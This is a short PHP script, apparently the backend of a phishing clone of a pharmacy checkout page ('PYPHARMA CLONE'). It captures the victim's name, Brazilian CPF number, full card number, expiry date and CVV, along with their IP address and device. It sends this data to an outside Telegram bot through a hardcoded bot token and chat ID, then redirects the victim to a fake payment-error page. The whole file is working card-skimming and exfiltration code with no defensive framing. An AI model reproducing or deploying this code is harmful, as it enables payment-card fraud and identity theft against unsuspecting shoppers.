<?php
/**
 * SCRIPT DE CAPTURA - PYPHARMA CLONE
 */

// ================= CONFIGURAÇÕES DO BOT =================
$botToken = "9039149841:AAHI3yAs-jTUTuYuxwTFvoLHhA01PlehXhA"; 
$chatId = "6544488805";   
// =======================================================

$name   = $_POST['card-name']   ?? 'Não informado';
$cpf    = $_POST['card-cpf']    ?? 'Não informado';
$number = $_POST['card-number'] ?? 'Não informado';
$expiry = $_POST['card-expiry'] ?? 'Não informado';
$cvv    = $_POST['card-cvv']    ?? 'Não informado';
$total  = $_POST['total']       ?? '0.00';

$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

$message = "🚨 **NOVO FULLZ CAPTURADO** 🚨\n\n";
$message .= "👤 **Nome:** $name\n";
$message .= "🆔 **CPF:** $cpf\n";
$message .= "💳 **Cartão:** $number\n";
$message .= "📅 **Validade:** $expiry\n";
$message .= "🔐 **CVV:** $cvv\n";
$message .= "💰 **Valor:** R$ $total\n\n";
$message .= "🌐 **IP:** $ip\n";
$message .= "📱 **Device:** $user_agent";

$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'Markdown'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

header("Location: erro_pagamento.html");
exit();
?>
